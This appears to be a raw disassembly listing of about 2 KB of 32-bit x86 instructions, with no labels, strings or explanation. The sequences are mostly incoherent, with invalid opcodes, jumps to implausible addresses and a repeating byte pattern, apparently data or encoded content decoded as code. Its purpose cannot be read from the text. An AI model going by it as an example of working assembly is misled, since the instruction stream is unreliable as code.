  40181d:	add    BYTE PTR [edx+0x5],ah
  401820:	inc    ebx
  401821:	add    BYTE PTR [eax+0x78],al
  401824:	inc    ecx
  401825:	add    BYTE PTR [eax+0x41],bl
  401828:	bound  eax,QWORD PTR [ecx+0x40]
  40182b:	and    ah,BYTE PTR ds:0x34d54537
  401831:	push   ss
  401832:	inc    eax
  401833:	push   esi
  401834:	or     DWORD PTR [edi],esi
  401836:	xlat   BYTE PTR ds:[ebx]
  401837:	cmp    esp,esi
  401839:	push   0x6d675d40
  40183e:	loopne 0x401826
  401840:	outs   dx,DWORD PTR ds:[esi]
  401841:	arpl   WORD PTR [edx+0x0],cx
  401844:	inc    edi
  401845:	cmp    BYTE PTR ds:0x4d780d44,dh
  40184b:	xor    BYTE PTR [ecx],ah
  40184d:	outs   dx,DWORD PTR ds:[esi]
  40184e:	dec    eax
  40184f:	sub    al,0x52
  401851:	test   al,0x25
  401853:	push   ebx
  401854:	inc    edx
  401855:	cs inc eax
  401857:	test   BYTE PTR [eax],al
  401859:	int3   
  40185a:	bound  eax,QWORD PTR ds:0xcc840f41
  401860:	inc    ebx
  401861:	add    BYTE PTR [eax+0x0],al
  401864:	inc    eax
  401865:	inc    eax
  401866:	inc    eax
  401867:	int3   
  401868:	add    BYTE PTR ds:0x62404341,al
  40186e:	pop    eax
  40186f:	add    BYTE PTR [ebx+0x40],al
  401872:	bound  ecx,QWORD PTR [edi]
  401874:	inc    eax
  401875:	adc    eax,0x36cf097e
  40187a:	add    DWORD PTR [eax+0x52cd7b2f],esp
  401880:	sub    ch,BYTE PTR [ecx]
  401882:	push   edi
  401883:	sub    al,0x29
  401885:	push   ecx
  401886:	inc    edx
  401887:	inc    esi
  401888:	inc    esp
  401889:	sub    al,0x80
  40188b:	dec    edx
  40188c:	xor    al,0x42
  40188e:	(bad)  
  40188f:	fisub  DWORD PTR [esi]
  401891:	add    DWORD PTR [ecx],esp
  401893:	popa   
  401894:	and    DWORD PTR [ebp+0x44],ecx
  401897:	leave  
  401898:	(bad)  [ebp+0x45]
  40189b:	mov    ebp,0x2c2c3423
  4018a0:	in     al,0x30
  4018a2:	add    BYTE PTR [eax],al
  4018a4:	inc    eax
  4018a5:	inc    eax
  4018a6:	cmovno eax,DWORD PTR ds:0x40056243
  4018ad:	int3   
  4018ae:	add    ah,cl
  4018b0:	inc    eax
  4018b1:	inc    eax
  4018b2:	bound  eax,QWORD PTR [ecx+0x0]
  4018b5:	add    BYTE PTR [edi],cl
  4018b7:	inc    ebx
  4018b8:	inc    eax
  4018b9:	inc    eax
  4018ba:	add    BYTE PTR [ecx+0x43],al
  4018bd:	add    eax,0x40256240
  4018c2:	bound  eax,QWORD PTR [eax]
  4018c4:	add    BYTE PTR ds:0x7c2529,bh
  4018ca:	test   al,0x25
  4018cc:	sub    BYTE PTR [ebp+0x4e44342c],ah
  4018d2:	adc    DWORD PTR ds:0xe030e143,esp
  4018d8:	in     eax,dx
  4018d9:	cmp    cl,BYTE PTR [ebx+ecx*1+0x1]
  4018dd:	and    esi,DWORD PTR [eax]
  4018df:	call   0x61f5:0x60082106
  4018e6:	and    DWORD PTR [ebp+eax*1+0x0],ecx
  4018ea:	int3   
  4018eb:	inc    eax
  4018ec:	inc    ecx
  4018ed:	inc    eax
  4018ee:	inc    ebx
  4018ef:	bound  esp,QWORD PTR ds:0x41400043
  4018f5:	add    BYTE PTR [eax],al
  4018f7:	add    eax,0x43624062
  4018fc:	inc    ecx
  4018fd:	inc    eax
  4018fe:	inc    eax
  4018ff:	inc    eax
  401900:	add    eax,0x40624340
  401905:	add    eax,0x40664140
  40190a:	dec    ebp
  40190b:	test   al,0x42
  40190d:	jp     0x401918
  40190f:	push   0x60
  401911:	retf   0x662d
  401914:	adc    BYTE PTR [esi],ch
  401916:	add    cl,BYTE PTR [ecx]
  401918:	jp     0x4018ef
  40191a:	jp     0x40195a
  40191c:	sub    al,0x2f
  40191e:	pusha  
  40191f:	addr16 and eax,0x418cd549
  401925:	sub    DWORD PTR [ebx+eiz*8+0x30],ecx
  401929:	fcomp  QWORD PTR [ecx]
  40192b:	or     al,0xf4
  40192d:	xor    al,0x1
  40192f:	jmp    0x6332ca6d
  401934:	adc    esp,DWORD PTR [ebx]
  401936:	inc    esi
  401937:	sub    eax,DWORD PTR [ebx+0x0]
  40193a:	add    eax,0x41107840
  40193f:	bound  eax,QWORD PTR [eax+0x40]
  401942:	sldt   WORD PTR [eax-0x34]
  401946:	js     0x4019aa
  401948:	add    eax,0x40664143
  40194d:	inc    ebx
  40194e:	add    BYTE PTR [ecx+0x5],al
  401951:	js     0x401993
  401953:	bound  eax,QWORD PTR [eax+0x0]
  401956:	inc    eax
  401957:	adc    al,0x62
  401959:	dec    eax
  40195a:	mov    ch,0x60
  40195c:	and    eax,0x4c6de387
  401961:	cmp    al,0x2c
  401963:	push   ebp
  401964:	cs dec esp
  401966:	arpl   WORD PTR [eax+ecx*1],si
  401969:	js     0x40197d
  40196b:	arpl   WORD PTR [esi],bp
  40196d:	add    ah,ah
  40196f:	cs retf 
  401971:	int    0xb0
  401973:	fwait
  401974:	inc    ecx
  401975:	inc    ebx
  401976:	inc    eax
  401977:	inc    eax
  401978:	add    eax,0x434162
  40197d:	inc    eax
  40197e:	add    BYTE PTR [edx+0x5],ah
  401981:	inc    eax
  401982:	adc    BYTE PTR [edx+0x40],ah
  401985:	inc    ebx
  401986:	inc    ecx
  401987:	add    eax,0x4340
  40198c:	add    eax,0x404162
  401991:	add    BYTE PTR [eax+0x43],al
  401994:	inc    eax
  401995:	add    eax,0x2567212f
  40199a:	dec    ebp
  40199b:	sbb    eax,0x3803ab15
  4019a0:	scas   eax,DWORD PTR es:[edi]
  4019a1:	xor    al,0x3f
  4019a3:	imul   BYTE PTR [ebp+0xf]
  4019a6:	inc    eax
  4019a7:	xor    BYTE PTR [eax+0x2e],0x6
  4019ab:	inc    esp
  4019ac:	stos   DWORD PTR es:[edi],eax
  4019ad:	loop   0x4019ef
  4019af:	das    
  4019b0:	aaa    
  4019b1:	das    
  4019b2:	sub    BYTE PTR [esp+esi*4],ch
  4019b5:	and    DWORD PTR [eax-0x6],eax
  4019b8:	leave  
  4019b9:	add    eax,esp
  4019bb:	jbe    0x401988
  4019bd:	mov    WORD PTR [edx+0x4f],cs
  4019c0:	sub    eax,DWORD PTR [eax-0x57]
  4019c3:	lds    ecx,FWORD PTR [ebp+0x61]
  4019c6:	dec    ebp
  4019c7:	cmp    DWORD PTR [ebx+0x48],0x626345b4
  4019ce:	and    al,0x40
  4019d0:	add    BYTE PTR [eax],al
  4019d2:	inc    ecx
  4019d3:	inc    ebx
  4019d4:	add    eax,0x41784062
  4019d9:	inc    eax
  4019da:	inc    eax
  4019db:	add    BYTE PTR [edi],cl
  4019dd:	bound  eax,QWORD PTR [ebx+0x0]
  4019e0:	add    eax,0x25006240
  4019e5:	inc    eax
  4019e6:	add    eax,0x40254143
  4019eb:	add    eax,0x49620000
  4019f0:	mov    eax,ds:0xb0dec460
  4019f5:	push   ss
  4019f6:	and    eax,0x37405382
  4019fb:	push   cs
  4019fc:	add    eax,0x612324b0
  401a01:	inc    eax
  401a02:	(bad)  
  401a03:	clc    
  401a04:	sub    BYTE PTR [edx+0x2f],ah
  401a07:	dec    esp
  401a08:	jae    0x401a5a
  401a0a:	dec    esp
  401a0b:	je     0x4019a7
  401a0d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401a0e:	and    eax,DWORD PTR [eax+eiz*1]
  401a11:	or     BYTE PTR [esi+ebx*8+0x431562],bl
  401a18:	add    BYTE PTR [eax],al
  401a1a:	inc    ecx
  401a1b:	inc    eax
  401a1c:	bound  esp,QWORD PTR [esi+0x0]
  401a1f:	inc    eax
  401a20:	add    eax,0x5400000
  401a25:	inc    ecx
  401a26:	inc    eax
  401a27:	inc    eax
  401a28:	bound  esp,QWORD PTR ds:0x25050043
  401a2e:	inc    ecx
  401a2f:	inc    ebx
  401a30:	inc    eax
  401a31:	test   BYTE PTR [eax+0x0],al
  401a34:	bound  ebx,QWORD PTR [eax+0x62]
  401a37:	inc    ecx
  401a38:	inc    eax
  401a39:	and    DWORD PTR cs:[edi],ebp
  401a3c:	inc    eax
  401a3d:	dec    ecx
  401a3e:	(bad)  
  401a40:	retf   
  401a41:	and    eax,0x16604a47
  401a46:	aad    0xa0
  401a48:	push   esp
  401a49:	sub    al,0x1
  401a4b:	jmp    0x6352fb93
  401a50:	xor    esi,DWORD PTR [edx]
  401a52:	jo     0x4019e4
  401a54:	les    esp,FWORD PTR [ebx-0x67]
  401a57:	gs pushf 
  401a59:	xor    eax,0x40621001
  401a5e:	inc    ecx
  401a5f:	and    eax,0x40000500
  401a64:	inc    ebx
  401a65:	add    eax,0x40624041
  401a6a:	inc    ebx
  401a6b:	add    eax,0x43402541
  401a70:	bound  eax,QWORD PTR [eax+0x43]
  401a73:	int3   
  401a74:	inc    eax
  401a75:	bound  eax,QWORD PTR [eax]
  401a77:	inc    ecx
  401a78:	inc    eax
  401a79:	inc    eax
  401a7a:	add    eax,0x4f6a6305
  401a7f:	lahf   
  401a80:	clc    
  401a81:	or     eax,0x40bb526d
  401a86:	push   es
  401a87:	pop    eax
  401a88:	ins    BYTE PTR es:[edi],dx
  401a89:	jnp    0x401ab8
  401a8b:	add    DWORD PTR [edi-0x73],ebp
  401a8e:	loope  0x401aea
  401a90:	push   0xffffffa4
  401a92:	xor    dl,BYTE PTR [edi-0x329c959f]
  401a98:	nop
  401a99:	bound  eax,QWORD PTR [eax+0x25]
  401a9c:	add    BYTE PTR [esi+0x40],ah
  401a9f:	add    eax,0x40404143
  401aa4:	inc    ebx
  401aa5:	add    BYTE PTR [eax],al
  401aa7:	add    BYTE PTR [edx-0x34],ah
  401aaa:	inc    eax
  401aab:	add    eax,0x40004041
  401ab0:	inc    ecx
  401ab1:	int3   
  401ab2:	add    BYTE PTR [ebx-0x7c],al
  401ab5:	add    eax,0x5406240
  401aba:	bound  ecx,QWORD PTR ds:0x4066552f
  401ac0:	push   ebp
  401ac1:	adc    eax,0x8126cb55
  401ac6:	and    DWORD PTR [esp+esi*1+0x6da4d7f9],edi
  401acd:	or     al,0x7f
  401acf:	dec    ecx
  401ad0:	jae    0x401b16
  401ad2:	inc    eax
  401ad3:	bound  ebx,QWORD PTR [eax+0x41]
  401ad6:	add    eax,0x40404340
  401adb:	inc    ebx
  401adc:	inc    eax
  401add:	test   BYTE PTR [eax],al
  401adf:	add    eax,0x40624041
  401ae4:	inc    eax
  401ae5:	add    BYTE PTR [edx+0x5],ah
  401ae8:	inc    ebx
  401ae9:	add    BYTE PTR [eax+0x78],al
  401aec:	inc    ecx
  401aed:	add    BYTE PTR [eax+0x41],bl
  401af0:	(bad)  
  401af1:	fmul   QWORD PTR [ecx+0x37]
  401af4:	xlat   BYTE PTR ds:[ebx]
  401af5:	mov    eax,ds:0x652c3edc
  401afa:	iret   
  401afb:	aaa    
  401afc:	add    eax,DWORD PTR [ebp+0x4a]
  401aff:	pop    ebx
  401b00:	jo     0x401aba
  401b02:	aam    0x37
  401b04:	shl    DWORD PTR [ebx-0x73acbc0],0xa4
  401b0b:	ins    DWORD PTR es:[edi],dx
  401b0c:	sbb    eax,0x124c4d03
  401b11:	cwde   
  401b12:	cli    
  401b13:	cmp    cl,al
  401b15:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401b16:	inc    eax
  401b17:	test   BYTE PTR [eax],al
  401b19:	int3   
  401b1a:	bound  eax,QWORD PTR ds:0xcc840f41
  401b20:	inc    ebx
  401b21:	add    BYTE PTR [eax+0x0],al
  401b24:	inc    eax
  401b25:	inc    eax
  401b26:	inc    eax
  401b27:	int3   
  401b28:	add    BYTE PTR ds:0x62404341,al
  401b2e:	pop    eax
  401b2f:	add    BYTE PTR [ebx+0x40],al
  401b32:	bound  ecx,QWORD PTR [edi]
  401b34:	inc    eax
  401b35:	inc    eax
  401b36:	xor    al,BYTE PTR [edx+0x106f3505]
  401b3c:	les    ebp,FWORD PTR [edi]
  401b3e:	hlt    
  401b3f:	lahf   
  401b40:	xchg   ecx,esi
  401b42:	shr    BYTE PTR cs:[eax+0x7a584440],0x9c
  401b4a:	das    
  401b4b:	adc    al,0x29
  401b4d:	inc    eax
  401b4e:	jge    0x401baa
  401b50:	pop    DWORD PTR [ebp+0x407e1629]
  401b56:	push   0x34cc68d5
  401b5b:	shl    DWORD PTR ds:0x134a306f,0x0
  401b62:	add    BYTE PTR [eax+0x40],al
  401b65:	cmovno eax,DWORD PTR ds:0x40056243
  401b6c:	int3   
  401b6d:	add    ah,cl
  401b6f:	inc    eax
  401b70:	inc    eax
  401b71:	bound  eax,QWORD PTR [ecx+0x0]
  401b74:	add    BYTE PTR [edi],cl
  401b76:	inc    ebx
  401b77:	inc    eax
  401b78:	inc    eax
  401b79:	add    BYTE PTR [ecx+0x43],al
  401b7c:	add    eax,0x40256240
  401b81:	bound  eax,QWORD PTR [eax]
  401b83:	bound  esp,QWORD PTR [ecx]
  401b85:	(bad)  
  401b86:	mov    ebp,0x3dcd3c41
  401b8b:	test   eax,0xab6fc423
  401b90:	push   0x1f
  401b92:	jne    0x401bd6
  401b94:	sub    DWORD PTR [ebx+0x44605821],edi
  401b9a:	popa   
  401b9b:	aad    0x2c
  401b9d:	jae    0x401bc7
  401b9f:	(bad)  
  401ba0:	call   0x30851fd2
  401ba5:	inc    eax
  401ba6:	gs add eax,0x4140cc00
  401bac:	inc    eax
  401bad:	inc    ebx
  401bae:	bound  esp,QWORD PTR ds:0x41400043
  401bb4:	add    BYTE PTR [eax],al
  401bb6:	add    eax,0x43624062
  401bbb:	inc    ecx
  401bbc:	inc    eax
  401bbd:	inc    eax
  401bbe:	inc    eax
  401bbf:	add    eax,0x40624340
  401bc4:	add    eax,0x40664140
  401bc9:	inc    eax
  401bca:	ins    BYTE PTR es:[di],dx
  401bcc:	arpl   WORD PTR [edx+0x30],dx
  401bcf:	jno    0x401bec
  401bd1:	push   0x4c
  401bd3:	int    0x44
  401bd5:	test   al,0x21
  401bd7:	fisub  DWORD PTR [edi]
  401bd9:	outs   dx,DWORD PTR ds:[esi]
  401bda:	adc    DWORD PTR [esi],ebp
  401bdc:	xor    al,0x12
  401bde:	pusha  
  401bdf:	ret    0x6a23
  401be2:	leave  
  401be3:	xchg   esi,eax
  401be4:	cwde   
  401be5:	xchg   esp,eax
  401be6:	jp     0x401c22
  401be8:	in     eax,0x41
  401bea:	scas   eax,DWORD PTR es:[edi]
  401beb:	mov    edi,0x40251562
  401bf0:	push   esi
  401bf1:	inc    edi
  401bf2:	out    dx,eax
  401bf3:	mov    edi,0x2930cb45
  401bf8:	loope  0x401b86
  401bfa:	lods   al,BYTE PTR ds:[esi]
  401bfb:	mov    edi,0x43394c63
  401c00:	add    BYTE PTR ds:0x41107840,al
  401c06:	bound  eax,QWORD PTR [eax+0x40]
  401c09:	sldt   WORD PTR [eax-0x34]
  401c0d:	js     0x401c71
  401c0f:	add    eax,0x40664143
  401c14:	inc    ebx
  401c15:	add    BYTE PTR [ecx+0x5],al
  401c18:	js     0x401c5a
  401c1a:	bound  eax,QWORD PTR [eax+0x0]
  401c1d:	inc    eax
  401c1e:	fndisi(8087 only) 
  401c20:	gs ins DWORD PTR es:[edi],dx
  401c22:	push   0x4d
  401c24:	ss adc al,0xc1
  401c27:	fs inc eax
  401c29:	dec    ecx
  401c2a:	lds    edi,FWORD PTR [ecx+eax*4+0x6d]
  401c2e:	push   ecx
  401c2f:	xor    ebx,DWORD PTR [ebp+0x62]
  401c32:	inc    edx
  401c33:	sub    eax,0xe54b347b
  401c38:	push   0x4c
  401c3a:	inc    edi
  401c3b:	arpl   WORD PTR [ecx+0x2e],ax
  401c3e:	inc    ecx
  401c3f:	inc    ebx
  401c40:	inc    eax
  401c41:	inc    eax
  401c42:	add    eax,0x434162
  401c47:	inc    eax
  401c48:	add    BYTE PTR [edx+0x5],ah
  401c4b:	inc    eax
  401c4c:	adc    BYTE PTR [edx+0x40],ah
  401c4f:	inc    ebx
  401c50:	inc    ecx
  401c51:	add    eax,0x4340
  401c56:	add    eax,0x404162
  401c5b:	add    BYTE PTR [eax+0x43],al
  401c5e:	inc    eax
  401c5f:	add    eax,0x384225c5
  401c64:	in     al,dx
  401c65:	pop    eax
  401c66:	and    DWORD PTR ds:0xc3bcbd0a,0x34c3dc48
  401c70:	rcr    DWORD PTR [ecx+0x40],0xbc
  401c74:	cmp    al,0xa3
  401c76:	test   al,0x2e
  401c78:	iret   
  401c79:	and    DWORD PTR [ecx+eax*2+0x2f0d8a68],edi
  401c80:	(bad)  
  401c81:	cmp    al,0x40
  401c83:	mov    ds:0x3cbc2d5,eax
  401c88:	or     ah,BYTE PTR [ecx-0x51be5fed]
  401c8e:	inc    esp
  401c8f:	inc    eax
  401c90:	(bad)  
  401c91:	test   DWORD PTR [bp+si-0x12],esp
  401c95:	bound  ecx,QWORD PTR [edi+0x48]
  401c98:	dec    ecx
  401c99:	and    ah,BYTE PTR [edx-0x37]
  401c9c:	inc    eax
  401c9d:	add    BYTE PTR [eax],al
  401c9f:	inc    ecx
  401ca0:	inc    ebx
  401ca1:	add    eax,0x41784062
  401ca6:	inc    eax
  401ca7:	inc    eax
  401ca8:	add    BYTE PTR [edi],cl
  401caa:	bound  eax,QWORD PTR [ebx+0x0]
  401cad:	add    eax,0x25006240
  401cb2:	inc    eax
  401cb3:	add    eax,0x40254143
  401cb8:	add    eax,0x14620000
  401cbd:	retf   
  401cbe:	inc    ebp
  401cbf:	inc    eax
  401cc0:	into   
  401cc1:	and    esi,DWORD PTR [edx+0x4c]
  401cc4:	cmp    BYTE PTR [esp+edi*1+0x40],al
  401cc8:	xor    ch,BYTE PTR [ebp+0x70]
  401ccb:	adc    DWORD PTR [edx+0x5d],ebx
  401cce:	sub    DWORD PTR [eax+0x3],eax
  401cd1:	loope  0x401d38
  401cd3:	retf   
  401cd4:	data16 jb 0x401d3f
  401cd7:	inc    eax
  401cd8:	iret   
  401cd9:	pop    esp
  401cda:	inc    ebp
  401cdb:	mov    esp,0x404152cd
  401ce0:	je     0x401d09
  401ce2:	mov    edi,0x7a431342
  401ce7:	inc    eax
  401ce8:	(bad)  
  401ce9:	pop    eax
  401cea:	fnstenv [ebx]
  401cec:	repnz adc BYTE PTR [ecx-0x67],ch
  401cf0:	inc    ebx
  401cf1:	add    BYTE PTR [eax],al
  401cf3:	add    BYTE PTR [ecx+0x40],al
  401cf6:	bound  esp,QWORD PTR [esi+0x0]
  401cf9:	inc    eax
  401cfa:	add    eax,0x5400000
  401cff:	inc    ecx
  401d00:	inc    eax
  401d01:	inc    eax
  401d02:	bound  esp,QWORD PTR ds:0x25050043
  401d08:	inc    ecx
  401d09:	inc    ebx
  401d0a:	inc    eax
  401d0b:	test   BYTE PTR [eax+0x0],al
  401d0e:	bound  ebx,QWORD PTR [eax+0x62]
  401d11:	inc    ecx
  401d12:	inc    eax
  401d13:	mov    ebx,0x8d2448e1
  401d18:	push   edx
  401d19:	push   0xf0d86faa
  401d1e:	mov    esp,0x7c341770
  401d23:	jae    0x401cc6
  401d25:	lahf   
  401d26:	add    eax,0x9b40c85b
  401d2b:	les    ebp,FWORD PTR [edi+0x62c5c941]
  401d31:	xchg   esp,eax
  401d32:	xchg   edx,eax
  401d33:	outs   dx,DWORD PTR ds:[esi]
  401d34:	enter  0x4140,0x29
  401d38:	adc    BYTE PTR [edx+0x40],ah
  401d3b:	inc    ecx
  401d3c:	and    eax,0x40000500
  401d41:	inc    ebx
  401d42:	add    eax,0x40624041
  401d47:	inc    ebx
  401d48:	add    eax,0x43402541
  401d4d:	bound  eax,QWORD PTR [eax+0x43]
  401d50:	int3   
  401d51:	inc    eax
  401d52:	bound  eax,QWORD PTR [eax]
  401d54:	inc    ecx
  401d55:	inc    eax
  401d56:	inc    eax
  401d57:	add    eax,0x153dd605
  401d5c:	outs   dx,DWORD PTR ds:[esi]
  401d5d:	in     eax,0xcc
  401d5f:	aaa    
  401d60:	cdq    
  401d61:	mov    esi,0x44c0c8c3
  401d66:	inc    edx
  401d67:	loope  0x401cf6
  401d69:	dec    esp
  401d6a:	xchg   esp,eax
  401d6b:	adc    bh,BYTE PTR [edi-0x1b]
  401d6e:	cmp    BYTE PTR [esi+0x64],ch
  401d71:	(bad)  
  401d72:	adc    eax,0x186328c7
  401d77:	xor    al,0x5b
  401d79:	cli    
  401d7a:	leave  
  401d7b:	mov    es,ecx
  401d7d:	call   0xbc4f5fc2
  401d82:	inc    ecx
  401d83:	mov    ah,BYTE PTR [edx+0x40]
  401d86:	and    eax,0x5406600
  401d8b:	inc    ebx
  401d8c:	inc    ecx
  401d8d:	inc    eax
  401d8e:	inc    eax
  401d8f:	inc    ebx
  401d90:	add    BYTE PTR [eax],al
  401d92:	add    BYTE PTR [edx-0x34],ah
  401d95:	inc    eax
  401d96:	add    eax,0x40004041
  401d9b:	inc    ecx
  401d9c:	int3   
  401d9d:	add    BYTE PTR [ebx-0x7c],al
  401da0:	add    eax,0x5406240
  401da5:	bound  eax,QWORD PTR [edx+0x29]
  401da8:	jb     0x401d49
  401daa:	fsub   DWORD PTR [esi+0x48]
  401dad:	test   al,0xc0
  401daf:	dec    esi
  401db0:	inc    eax
  401db1:	inc    edx
  401db2:	pop    esp
  401db3:	ret    
  401db4:	adc    al,0xd1
  401db6:	and    DWORD PTR es:[eax+0x24],esi
  401dba:	lea    ebp,[ecx*8+0x40731661]
  401dc1:	jecxz  0x401e27
  401dc3:	bound  ebp,QWORD PTR [eax+0x65214696]
  401dc9:	dec    esi
  401dca:	pop    ebx
  401dcb:	push   eax
  401dcc:	inc    eax
  401dcd:	bound  ebx,QWORD PTR [eax+0x41]
  401dd0:	add    eax,0x40404340
  401dd5:	inc    ebx
  401dd6:	inc    eax
  401dd7:	test   BYTE PTR [eax],al
  401dd9:	add    eax,0x40624041
  401dde:	inc    eax
  401ddf:	add    BYTE PTR [edx+0x5],ah
  401de2:	inc    ebx
  401de3:	add    BYTE PTR [eax+0x78],al
  401de6:	inc    ecx
  401de7:	add    BYTE PTR [eax+0x41],bl
  401dea:	bound  ecx,QWORD PTR ds:0x4001c168
  401df0:	std    
  401df1:	int    0xc
  401df3:	retf   
  401df4:	inc    eax
  401df5:	jl     0x401e18
  401df7:	inc    eax
  401df8:	dec    eax
  401df9:	pop    es
  401dfa:	stc    
  401dfb:	dec    ebp
  401dfc:	inc    eax
  401dfd:	rcr    BYTE PTR [edx],0x40
  401e00:	test   al,0x40
  401e02:	test   BYTE PTR [eax],al
  401e04:	int3   
  401e05:	bound  eax,QWORD PTR ds:0xcc840f41
  401e0b:	inc    ebx
  401e0c:	add    BYTE PTR [eax+0x0],al
  401e0f:	inc    eax
  401e10:	inc    eax
  401e11:	inc    eax
  401e12:	int3   
  401e13:	add    BYTE PTR ds:0x62404341,al
  401e19:	pop    eax
  401e1a:	add    BYTE PTR [ebx+0x40],al
  401e1d:	bound  ecx,QWORD PTR [edi]
  401e1f:	inc    eax
  401e20:	lds    esp,FWORD PTR [edx+0x42]
  401e23:	inc    eax
  401e24:	xor    al,0x23
  401e26:	ds push eax
  401e28:	movq   mm3,QWORD PTR [eax+0x48af5140]
  401e2f:	sub    cl,BYTE PTR [ebp-0x3dc2f234]
  401e35:	inc    ecx
  401e36:	inc    eax
  401e37:	dec    edi
  401e38:	gs push ebx
  401e3a:	retf   
  401e3b:	in     al,dx
  401e3c:	ss gs sub al,0x35
  401e40:	pop    esp
  401e41:	xchg   edx,eax
  401e42:	add    DWORD PTR [ebx],esp
  401e44:	inc    eax
  401e45:	gs inc eax
  401e47:	inc    eax
  401e48:	adc    al,0x73
  401e4a:	xor    eax,0x40e160e1
  401e4f:	inc    eax
  401e50:	mov    WORD PTR [eax-0x74],gs
  401e53:	enter  0xde0b,0x40
  401e57:	add    DWORD PTR [eax],eax
  401e59:	add    BYTE PTR [eax+0x40],al
  401e5c:	cmovno eax,DWORD PTR ds:0x40056243
  401e63:	int3   
  401e64:	add    ah,cl
  401e66:	inc    eax
  401e67:	inc    eax
  401e68:	bound  eax,QWORD PTR [ecx+0x0]
  401e6b:	add    BYTE PTR [edi],cl
  401e6d:	inc    ebx
  401e6e:	inc    eax
  401e6f:	inc    eax
  401e70:	add    BYTE PTR [ecx+0x43],al
  401e73:	add    eax,0x40256240
  401e78:	bound  eax,QWORD PTR [eax]
  401e7a:	pop    ebp
  401e7b:	jmp    0xab3c:0xebc00f05
  401e82:	mov    edi,0x917f7b63
  401e87:	sbb    al,0x41
  401e89:	lock mov edi,0x21124845
  401e8f:	imul   edx,DWORD PTR [ebx+0x7d],0xffffffbf
  401e93:	cmp    al,0x45
  401e95:	aad    0x48
  401e97:	or     al,0x30
  401e99:	ret    
  401e9a:	pop    esp
  401e9b:	sub    eax,DWORD PTR ds:0x4140cc00
  401ea1:	inc    eax
  401ea2:	inc    ebx
  401ea3:	bound  esp,QWORD PTR ds:0x41400043
  401ea9:	add    BYTE PTR [eax],al
  401eab:	add    eax,0x43624062
  401eb0:	inc    ecx
  401eb1:	inc    eax
  401eb2:	inc    eax
  401eb3:	inc    eax
  401eb4:	add    eax,0x40624340
  401eb9:	add    eax,0x40664140
  401ebe:	push   eax
  401ebf:	lods   eax,DWORD PTR ds:[esi]
  401ec0:	shr    BYTE PTR [ecx],0x40
  401ec3:	adc    dl,ch
  401ec5:	mov    al,ds:0x42f3934
  401eca:	dec    esp
  401ecb:	stos   DWORD PTR es:[edi],eax
  401ecc:	inc    edx
  401ecd:	bound  ebx,QWORD PTR [ebx+0xa]
  401ed0:	push   ebx
  401ed1:	daa    
  401ed2:	push   0xffffffb8
  401ed4:	daa    
  401ed5:	inc    esi
  401ed6:	mov    eax,0xac208
  401edb:	dec    ebp
  401edc:	in     al,0x38
  401ede:	inc    ecx
  401edf:	mov    ah,0x25
  401ee1:	jmp    0x401eab
  401ee3:	push   ebx
  401ee4:	cli    
  401ee5:	ins    DWORD PTR es:[edi],dx
  401ee6:	jbe    0x401f2b
  401ee8:	add    BYTE PTR ds:0x41107840,al
  401eee:	bound  eax,QWORD PTR [eax+0x40]
  401ef1:	sldt   WORD PTR [eax-0x34]
  401ef5:	js     0x401f59
  401ef7:	add    eax,0x40664143
  401efc:	inc    ebx
  401efd:	add    BYTE PTR [ecx+0x5],al
  401f00:	js     0x401f42
  401f02:	bound  eax,QWORD PTR [eax+0x0]
  401f05:	inc    eax
  401f06:	jo     0x401f48
  401f08:	push   ebx
  401f09:	bound  esi,QWORD PTR [eax]
  401f0b:	inc    esp
  401f0c:	test   al,0x67
  401f0e:	push   ebx
  401f0f:	shl    BYTE PTR [edi+0x40],0x5e
  401f13:	dec    ebp
  401f14:	adc    BYTE PTR [ecx+0x4cbf233b],ch
  401f1a:	cld    
  401f1b:	(bad)  
  401f1c:	mov    eax,0x673994cc
  401f21:	sub    al,0x6a
  401f23:	dec    esp
  401f24:	inc    ecx
  401f25:	retf   
  401f26:	inc    esi
  401f27:	shr    cl,0x60
  401f2a:	push   ebx
  401f2b:	lahf   
  401f2c:	or     BYTE PTR [ecx+edi*1],bl
  401f2f:	adc    eax,0xe5dc672f
  401f34:	enter  0x2034,0x33
  401f38:	mov    ds:0x635a092c,eax
  401f3d:	mov    edi,0x43415107
  401f42:	inc    eax
  401f43:	inc    eax
  401f44:	add    eax,0x434162
  401f49:	inc    eax
  401f4a:	add    BYTE PTR [edx+0x5],ah
  401f4d:	inc    eax
  401f4e:	adc    BYTE PTR [edx+0x40],ah
  401f51:	inc    ebx
  401f52:	inc    ecx
  401f53:	add    eax,0x4340
  401f58:	add    eax,0x404162
  401f5d:	add    BYTE PTR [eax+0x43],al
  401f60:	inc    eax
  401f61:	add    eax,0x91445762
  401f66:	retf   
  401f67:	inc    ecx
  401f68:	aad    0xc0
  401f6a:	and    esp,edi
  401f6c:	cmp    BYTE PTR [bx+di],dl
  401f6f:	mov    edi,DWORD PTR [eax]
  401f71:	test   al,0x54
  401f73:	test   al,0x61
  401f75:	push   ebx
  401f76:	mov    al,ds:0x606037f8
  401f7b:	push   ebx
  401f7c:	in     al,dx
  401f7d:	inc    eax
  401f7e:	add    BYTE PTR [eax],al
  401f80:	inc    ecx
  401f81:	inc    ebx
  401f82:	add    eax,0x41784062
  401f87:	inc    eax
  401f88:	inc    eax
  401f89:	add    BYTE PTR [edi],cl
  401f8b:	bound  eax,QWORD PTR [ebx+0x0]
  401f8e:	add    eax,0x25006240
  401f93:	inc    eax
  401f94:	add    eax,0x40254143
  401f99:	add    eax,0x43620000
  401f9e:	or     eax,0x2f591d64
  401fa3:	cmp    DWORD PTR [eax+ebp*1-0x9],esp
  401fa7:	dec    eax
  401fa8:	inc    BYTE PTR [eax+0x45]
  401fab:	xchg   edx,eax
  401fac:	pushf  
  401fad:	jp     0x401ffe
  401faf:	aam    0x94
  401fb1:	xor    esp,DWORD PTR [ebx+0x78a8a873]
  401fb7:	ror    eax,1
  401fb9:	push   eax
  401fba:	push   ebx
  401fbb:	sub    BYTE PTR [ebx],0x12
  401fbe:	inc    esp
  401fbf:	xchg   edi,eax
  401fc0:	inc    esi
  401fc1:	shr    cl,0xcb
  401fc4:	sub    bl,BYTE PTR [eax+0x8]
  401fc7:	test   al,0xcf
  401fc9:	add    ebx,eax
  401fcb:	xor    DWORD PTR [ecx+eax*2+0x3d312e0],0x43
  401fd3:	add    BYTE PTR [eax],al
  401fd5:	add    BYTE PTR [ecx+0x40],al
  401fd8:	bound  esp,QWORD PTR [esi+0x0]
  401fdb:	inc    eax
  401fdc:	add    eax,0x5400000
  401fe1:	inc    ecx
  401fe2:	inc    eax
  401fe3:	inc    eax
